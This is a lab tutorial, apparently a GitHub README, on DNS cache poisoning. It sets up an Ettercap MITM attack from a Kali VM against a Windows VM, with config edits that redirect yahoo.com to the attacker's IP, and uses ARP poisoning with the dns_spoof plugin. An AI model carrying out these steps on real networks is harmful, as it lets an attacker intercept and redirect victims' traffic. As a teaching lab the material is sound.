# dns-cache-poisoning



## REQUIREMENTS

1. virtual box
2. Two virtual machines 

      . we are using kali machine for attacking and windows machine as victim
      
3. Ettercap Application
4. Apache Server
5. IpTables

## How to install requirements

1. Installing virtual box

     . visit https://www.virtualbox.org/wiki/Downloads and download according to the operating system
        
        
2. Download and install kali machine 64 bit on virtual box using the link provided

     . https://kali.download/virtual-images/kali-2022.1/kali-linux-2022.1-virtualbox-amd64.ova
       follows instruction in the site to install kali machine on virtual box
       https://itsfoss.com/install-kali-linux-virtualbox/
        
3. Installing ettercap on kali
     use below command to install Ettercap application
     
        sudo apt-get install ettercap
        
4. installing apache server
     use following command to install apache server on kali
        
        sudo apt-get install apache2
                
5. install Iptable
     use following command to install iptables on kali
     
        sudo apt-get install iptables
       
# Getting Ready


### Configuring
      
                 
##### Edit Ettercap configuration file
                 
             

We now need to edit the Ettercap configuration file since it is our application of choice for today.
Let's navigate to /etc/ettercap/etter.conf and open the file with a text editor like leafpad and edit the file. 
We can use following command for that.

        leafpad /etc/ettercap/etter.conf

So now we want to edit the uid and gid values at the top to make them say 0 so go ahead and do that.


       ############################################################################

        [privs]
        ec_uid = 0               # nobody is the default
        ec_gid = 0               # nobody is the default

        [mitm]
        arp_storm_delay = 10          # milliseconds
        arp_poison_smart = 0          # boolean

Now scroll down until you find the heading that says Linux and under that remove both the # signs for the sections below where it says "Linux".



        #---------------
        #     Linux 
        #---------------

           redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"
           redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"

        # pendant for IPv6 - Note that you need iptables v1.4.16 or newer to use IPv6 redirect
           redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"
           redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"

##### Edit Ettercap.dns file

  Edit the domain name to spoof and  edit the IP address to attackers IP address and save the file

        #                                                                          #
        # Sample hosts file for dns_spoof plugin                                   #
        #                                                                          #
        # the format is (for A query):                                             #
         *yahoo.com 		A	 172.20.10.4
         www.yahoo.com 		A	 172.20.10.4
         *.yahoo.com		A	 172.20.10.4	
        #
        #   *.foo.com          A 168.44.55.66 [optional TTL]                       #
        #      
        
##### Run ettercap application

   use folowing command to run Ettercap application from terminal
   
        ettercap -G
        
 1. choose primary interface and click accept on top right corner
 2. click on threen dots on top right to select options
        select Hosts --> Scan for Hosts     
        this will scan for the available devices connected to the network and save it to Hosts List
 3. click on threen dots on top right to select options
        select Hosts --> Hosts List
        it will list the hosts in network found on previous scanning step
 4. Select the victim's IP address and add it to target1 by clicking on "Add to Target1"
 5. select the DNS IP address and add it to target2 by clicking on "Add to Target2"
 6. now Click on Ettercap Menu and select Plugins --> Manage Plugins
        select dns_spoof. now right click and activate plugin
 7. click on man in the MITM Menu on top right corner near Ettercap Menu and select ARP Poisoning. click OK 


#### testing

All set now try accessng the website from victim's Machine.
it'll be redirected to the ip address specified in the etter.dns file

we can use the chk_poison to validate the poisoning
